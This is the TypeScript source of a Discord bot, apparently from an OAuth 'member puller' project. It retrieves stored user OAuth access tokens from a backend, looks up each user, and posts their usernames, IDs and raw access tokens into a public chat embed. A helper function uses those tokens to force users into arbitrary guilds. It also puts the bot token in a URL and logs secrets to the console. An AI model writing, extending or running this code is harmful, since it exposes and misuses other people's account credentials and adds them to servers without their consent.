import { Attachment, CommandInteraction, Embed, EmbedBuilder } from "discord.js";
import { ApplicationCommandOptionType, } from "discord.js";
import fs from "fs"
import * as threading from "worker_threads";

import { Discord, MetadataStorage, Slash, SlashOption } from "discordx";
async function pull_to_guild(bot_token: string, token: string, guild_id: string, id: string): Promise<any> {
  const data = {
    "access_token": token
  };
  const headers = {
    "Authorization": `Bot ${bot_token}`,
    "Content-Type": "application/json"
  };
  const response = await fetch(`https://discord.com/api/v8/guilds/${guild_id}/members/${id}`, {
    method: 'PUT',
    headers: headers,
    body: JSON.stringify(data)
  });
  const responseData = await response.json();
  console.log(responseData)
  return responseData;
}

@Discord()
export class Example {
  @Slash({ description: "see all active users" })
  async active_users(

    interaction: CommandInteraction,
  ): Promise<void> {
    const jsonString = fs.readFileSync('data.json', 'utf-8');
    const config = JSON.parse(jsonString);
    const urll = `${config.url}/active?token=${config.bot_token}`
    console.log(urll)
    const req = await fetch(urll)
    const res = await req.json()
    const array2 = res
    console.log(array2)
    const embed2 = new EmbedBuilder()
      .setFooter({ text: `https://github.com/uiisback/goauth - if u paid u got scammed` })
      .setTitle("**Active users**")
      


      for (const accessToken of array2) {
        try {
          const headers = {
            Authorization: `Bearer ${accessToken}`,
          };
          const req = await fetch('https://discord.com/api/v8/users/@me', {
          headers,
        })
        const data = await req.json();
        console.log(res)
          ;
          const id = data.id;
          embed2.addFields({name:`${data['username']}#${data['discriminator']}`, value: `id: \`${data['id']}\`\nAccess Token: \`${accessToken}\``})
        } catch (e) {
          console.log(e);
          continue;
        }
        
      }
    interaction.reply({ embeds: [embed2] });
    }
  

  
}
